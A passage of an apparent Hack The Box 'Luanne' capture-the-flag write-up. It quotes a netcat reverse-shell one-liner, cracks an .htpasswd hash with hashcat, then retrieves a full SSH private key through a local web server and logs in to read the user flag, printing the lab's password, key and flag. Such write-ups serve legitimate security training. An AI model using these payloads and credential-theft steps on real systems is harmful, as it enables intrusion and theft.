</pre></table></code></div></div><p>The command <code class="language-plaintext highlighter-rouge">uname -a</code> revealed this to be a NetBSD system. I wasn’t sure what kind of reverse shell would work on a BSD system, so I checked the one-stop-shop for all things Payload.</p><ul><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#netcat-openbsd</a></ul><blockquote><p><code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f</code></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/13-reverse-shell.png" alt="" /></p><p>I found a reverse shell with nc (without -e) for openbsd, and hoped that it would work for this distro as well. The response hung for awhile after sending, which was a good sign.</p><h2 id="initial-foothold">Initial Foothold</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>zweilos㉿kali<span class="o">)</span>-[~/htb/luanne]
└─<span class="nv">$ </span>script luanne-init  
Script started, output log file is <span class="s1">'luanne-init'</span><span class="nb">.</span>
┌──<span class="o">(</span>zweilos㉿kali<span class="o">)</span>-[~/htb/luanne]
└─<span class="nv">$ </span>bash
zweilos@kali:~/htb/luanne<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4242
listening on <span class="o">[</span>any] 4242 ...
connect to <span class="o">[</span>10.10.14.187] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.218] 54839
sh: can<span class="s1">'t access tty; job control turned off
$ id &amp;&amp; hostname
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
luanne.htb
</span></pre></table></code></div></div><p>It worked!</p><h3 id="enumeration-as-_httpd">Enumeration as <code class="language-plaintext highlighter-rouge">_httpd</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ which python3
which: PATH environment variable is not set
</pre></table></code></div></div><p>Checked to see if python3 was installed, but got an error that the PATH was not set. After some testing I found that my usual TTY upgrades were not working.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>$ pwd
/var/www
$ ls -la
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25 11:27 .
drwxr-xr-x  24 root  wheel  512 Nov 24 09:55 ..
-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
-rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt
$ cat .htpasswd 
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
</pre></table></code></div></div><p>found an MD5 hash in <code class="language-plaintext highlighter-rouge">.htpasswd</code></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/luanne]
└─$ hashcat -O -D1,2 -a0 -m500 hash /usr/share/wordlists/rockyou.txt --username
hashcat (v6.1.1) starting...

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest    

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
Time.Started.....: Sat Mar 27 20:11:46 2021 (0 secs)
Time.Estimated...: Sat Mar 27 20:11:46 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    30002 H/s (7.20ms) @ Accel:256 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3074/14344385 (0.02%)
Rejected.........: 2/3074 (0.07%)
Restore.Point....: 2048/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: slimshady -&gt; ANTHONY

Started: Sat Mar 27 20:11:43 2021
Stopped: Sat Mar 27 20:11:48 2021
</pre></table></code></div></div><p>It cracked within seconds to reveal the password <code class="language-plaintext highlighter-rouge">iamthebest</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/14-webapi.png" alt="" /></p><p>I was able to use this to log into the other web portal on port 80.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/15-webapi.png" alt="" /></p><p>There did not seem to be anything further I could do here other than discover the <code class="language-plaintext highlighter-rouge">/weather/forecast/</code> endpoint I had already used to gain access to the machine.</p><h2 id="road-to-user">Road to User</h2><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>$ find / -user r.michaels 2&gt;/dev/null
/proc/378
/proc/378/fd
/proc/378/task
/proc/378/emul
/proc/378/auxv
/proc/378/cmdline
/proc/378/environ
/proc/378/fpregs
/proc/378/limit
/proc/378/map
/proc/378/maps
/proc/378/mem
/proc/378/note
/proc/378/notepg
/proc/378/regs
/proc/378/stat
/proc/378/statm
/proc/378/status
/var/mail/r.michaels
/home/r.michaels
</pre></table></code></div></div><p>Since I only had one user to go off, I tried using that password to switch users to <code class="language-plaintext highlighter-rouge">r.michaels</code> but failed. I also tried finding everything that <code class="language-plaintext highlighter-rouge">r.michaels</code> had access to, but there wasn’t much.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ ls -la /home/r.michaels
ls: r.michaels: Permission denied
$ ls -la /var/mail/r.michaels
-rw-------  1 r.michaels  wheel  9172 Sep 16  2020 /var/mail/r.michaels
</pre></table></code></div></div><p>I tried to see what was in those directories, but couldn’t see anything I could access.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>$ ps -auxw
USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
nginx         79  2.5  0.1  33696  3308 ?     S    10:22AM 2:20.96 nginx: worker process 
root           0  0.0  0.2      0 13288 ?     OKl  10:21AM 0:22.40 [system]
root           1  0.0  0.0  19852  1528 ?     Is   10:21AM 0:00.01 init 
root         164  0.0  0.0  32528  2296 ?     Ss   10:21AM 0:00.18 /usr/sbin/syslogd -s 
root         267  0.0  0.1 117960  7340 ?     Il   10:21AM 0:38.76 /usr/pkg/bin/vmtoolsd 
root         308  0.0  0.0  19708  1336 ?     Is   10:21AM 0:00.00 /usr/sbin/powerd 
_httpd       336  0.0  0.3 119028 17052 ?     Ss   10:22AM 7:38.21 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 
root         347  0.0  0.0  73104  2916 ?     Is   10:22AM 0:00.04 /usr/sbin/sshd 
root         366  0.0  0.0  33368  1824 ?     Is   10:22AM 0:00.00 nginx: master process /usr/pkg/sbin/nginx 
r.michaels   378  0.0  0.0  34996  1996 ?     Is   10:22AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /hom
_httpd       394  0.0  0.0  35160  2004 ?     Ss   10:22AM 0:40.21 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
root         396  0.0  0.0  20216  1652 ?     Is   10:22AM 0:00.15 /usr/sbin/cron 
_httpd       408  0.0  0.0  19988  1652 ?     S    10:22AM 0:00.22 /bin/sh /usr/local/scripts/memory.sh 
_httpd       414  0.0  0.0  21748  1656 ?     I    10:22AM 0:00.63 /bin/sh /usr/local/scripts/processes.sh 
_httpd       422  0.0  0.0  19992  1656 ?     S    10:22AM 0:00.22 /bin/sh /usr/local/scripts/uptime.sh 

...snipped extra users attepts at reverse shells and privesc...

_httpd     18685  0.0  0.0  35460  2296 ?     I     9:02PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
_httpd     20969  0.0  0.0  35460  2296 ?     I     9:02PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
_httpd     21048  0.0  0.0  19884  1520 ?     O    12:41AM 0:00.00 ps -auxw 
_httpd     22683  0.0  0.0  35460  2332 ?     I    12:17AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr

...snipped more extra metagaming stuff...

root         419  0.0  0.0  19780  1584 ttyE0 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc constty 
root         413  0.0  0.0  19780  1584 ttyE1 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE1 
root         389  0.0  0.0  23792  1584 ttyE2 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE2 
root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE3
</pre></table></code></div></div><p>There was a process run by the <code class="language-plaintext highlighter-rouge">r.michaels</code> user that seemed to be running another instance of the <code class="language-plaintext highlighter-rouge">weather.lua</code>, this time on port 3001.</p><blockquote><p>Note: From other user’s attempts from the process output I saw one that showed<strong><code class="language-plaintext highlighter-rouge">python3.7 -c import pty;pty.spawn("/bin/sh")</code></strong>. You may be able to use this to upgrade your shell. I didn’t notice this until after I was done, and it would have been metagaming anyways!</p></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$ curl http://localhost:3001
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   199  100   199    0     0  66333      0 --:--:-- --:--:-- --:--:-- 66333
&lt;html&gt;&lt;head&gt;&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;h1&gt;401 Unauthorized&lt;/h1&gt;
/: &lt;pre&gt;No authorization&lt;/pre&gt;
&lt;hr&gt;&lt;address&gt;&lt;a href="//localhost:3001/"&gt;localhost:3001&lt;/a&gt;&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</pre></table></code></div></div><p>I tried using curl to get the local page at 3001 and got a “No Authorization” error.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$ curl -u webapi_user:iamthebest http://localhost:3001
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   386  100   386    0     0   125k      0 --:--:-- --:--:-- --:--:--  125k
&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Index&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;p&gt;&lt;h3&gt;Weather Forecast API&lt;/h3&gt;&lt;/p&gt;
    &lt;p&gt;&lt;h4&gt;List available cities:&lt;/h4&gt;&lt;/p&gt;
    &lt;a href="/weather/forecast?city=list"&gt;/weather/forecast?city=list&lt;/a&gt;
    &lt;p&gt;&lt;h4&gt;Five day forecast (London)&lt;/h4&gt;&lt;/p&gt;
    &lt;a href="/weather/forecast?city=London"&gt;/weather/forecast?city=London&lt;/a&gt;
    &lt;hr&gt;
  &lt;/body&gt;
&lt;/html&gt;
</pre></table></code></div></div><p>since this page was the same as the one on port 80 I tried logging in as <code class="language-plaintext highlighter-rouge">webapi_user</code>. This time I was able to retrieve the site. It looked exactly the same as the one on port 80.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$ curl -u webapi_user:iamthebest http://localhost:3001/r.michaels
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   206  100   206    0     0  68666      0 --:--:-- --:--:-- --:--:-- 68666
&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;
/~: &lt;pre&gt;This item has not been found&lt;/pre&gt;
&lt;hr&gt;&lt;address&gt;&lt;a href="//localhost:3001/"&gt;localhost:3001&lt;/a&gt;&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
$ curl -u webapi_user:iamthebest http://localhost:3001/~/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   207  100   207    0     0  51750      0 --:--:-- --:--:-- --:--:-- 51750
&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;
/~/: &lt;pre&gt;This item has not been found&lt;/pre&gt;
&lt;hr&gt;&lt;address&gt;&lt;a href="//localhost:3001/"&gt;localhost:3001&lt;/a&gt;&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</pre></table></code></div></div><p>I tried to see if I could access the home directory since this process was being run as</p><p>searched for how to access home directory in a URL and found</p><ul><li><a href="https://apple.stackexchange.com/questions/100570/getting-all-files-from-a-web-page-using-curl">https://apple.stackexchange.com/questions/100570/getting-all-files-from-a-web-page-using-curl</a><li><a href="https://stackoverflow.com/questions/3488603/how-do-i-use-tilde-in-the-context-of-paths">https://stackoverflow.com/questions/3488603/how-do-i-use-tilde-in-the-context-of-paths</a></ul><blockquote><p>Used in URLs, interpretation of the tilde as a shorthand for a user’s home directory (e.g., <a href="http://www.foo.org/~bob">http://www.foo.org/~bob</a>) is a convention borrowed from Unix. Implementation is entirely server-specific, so you’d need to check the documentation for your web server to see if it has any special meaning.</p></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   172    0   172    0     0  57333      0 --:--:-- --:--:-- --:--:-- 57333
&lt;html&gt;&lt;head&gt;&lt;title&gt;Document Moved&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;h1&gt;Document Moved&lt;/h1&gt;
This document had moved &lt;a href="http://localhost:3001/~r.michaels/"&gt;here&lt;/a&gt;
&lt;/body&gt;&lt;/html&gt;
</pre></table></code></div></div><p>The post was related to python, but it seemed to work, at least somewhat</p><ul><li><a href="https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/">https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/</a></ul><p>it seems like the tilde thing is also used specifically in nginx</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>$ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   601    0   601    0     0   117k      0 --:--:-- --:--:-- --:--:--  117k
&lt;!DOCTYPE html&gt;
&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"/&gt;
&lt;style type="text/css"&gt;
table {
        border-top: 1px solid black;
        border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
&lt;/style&gt;
&lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt;
&lt;table cols=3&gt;
&lt;thead&gt;
&lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align=right&gt;Size
&lt;tbody&gt;
&lt;tr&gt;&lt;td&gt;&lt;a href="../"&gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align=right&gt;1kB
&lt;tr&gt;&lt;td&gt;&lt;a href="id_rsa"&gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align=right&gt;3kB
&lt;/table&gt;
&lt;/body&gt;&lt;/html&gt;
</pre></table></code></div></div><p>Putting the trailing slash on the url caused it to give me a directory listing</p><p>id_rsa sounded quite interesting</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>$ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa
sh: 48: Syntax error: redirection unexpected
$ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   245  100   245    0     0  81666      0 --:--:-- --:--:-- --:--:-- 81666
&lt;html&gt;&lt;head&gt;&lt;title&gt;500 Internal Error&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;h1&gt;500 Internal Error&lt;/h1&gt;
~r.michaels/id_rsa/index.html: &lt;pre&gt;An error occured on the server&lt;/pre&gt;
&lt;hr&gt;&lt;address&gt;&lt;a href="//localhost:3001/"&gt;localhost:3001&lt;/a&gt;&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</pre></table></code></div></div><p>However, trying to retrieve the <code class="language-plaintext highlighter-rouge">id_rsa</code> file gave some errors.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ curl -u webapi_user:iamthebest ftp://localhost:3001/~r.michaels/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:30 --:--:--     0
curl: (56) response reading failed
</pre></table></code></div></div><p>Next I tried switching protocols to use ftp:// rather than http:// but that failed as well</p><h3 id="further-enumeration">Further enumeration</h3><h3 id="finding-user-creds">Finding user creds</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre>$ curl -u webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2610  100  2610    0     0   637k      0 --:--:-- --:--:-- --:--:--  637k
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
</pre></table></code></div></div><p>I was finally able to get it by removing the specification for curl to interpret what it was pulling through the HTTP protocol</p><h3 id="usertxt">User.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>zweilos@kali:~/htb/luanne$ chmod 600 r.michaels.key 
zweilos@kali:~/htb/luanne$ ssh -i r.michaels.key r.michaels@10.10.10.218
Last login: Sat Mar 27 21:16:20 2021 from 10.10.14.220
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ id &amp;&amp; whoami
uid=1000(r.michaels) gid=100(users) groups=100(users)
r.michaels
luanne$ ls -la
total 52
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 .
drwxr-xr-x  3 root        wheel   512 Sep 14  2020 ..
-rw-r--r--  1 r.michaels  users  1772 Feb 14  2020 .cshrc
drwx------  2 r.michaels  users   512 Sep 14  2020 .gnupg
-rw-r--r--  1 r.michaels  users   431 Feb 14  2020 .login
-rw-r--r--  1 r.michaels  users   265 Feb 14  2020 .logout
-rw-r--r--  1 r.michaels  users  1498 Feb 14  2020 .profile
-rw-r--r--  1 r.michaels  users   166 Feb 14  2020 .shrc
dr-x------  2 r.michaels  users   512 Sep 16  2020 .ssh
dr-xr-xr-x  2 r.michaels  users   512 Nov 24 09:26 backups
dr-xr-x---  4 r.michaels  users   512 Sep 16  2020 devel
dr-x------  2 r.michaels  users   512 Sep 16  2020 public_html
-r--------  1 r.michaels  users    33 Sep 16  2020 user.txt
luanne$ cat user.txt
ea5f0ce6a917b0be1eabc7f9218febc0
</pre></table></code></div></div><p>got the user.txt flag</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user-rmichaels">Enumeration as User <code class="language-plaintext highlighter-rouge">r.michaels</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>luanne$ groups r.michaels
users
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">r.michaels</code> was only a member of the users group</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>luanne$ cd backups/                                                                                   
luanne$ ls -la
total 12
dr-xr-xr-x  2 r.michaels  users   512 Nov 24 09:26 .
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">/backups</code> folder there was an encrypted tar file. Searching for netbsd tar.gz.enc led to</p><ul><li><a href="https://man.netbsd.org/netpgp.1">https://man.netbsd.org/netpgp.1</a></ul><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc | tar xz -C test           
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key &lt;r.michaels@localhost&gt;
tar: Error opening archive: Failed to open '/dev/nrst0'
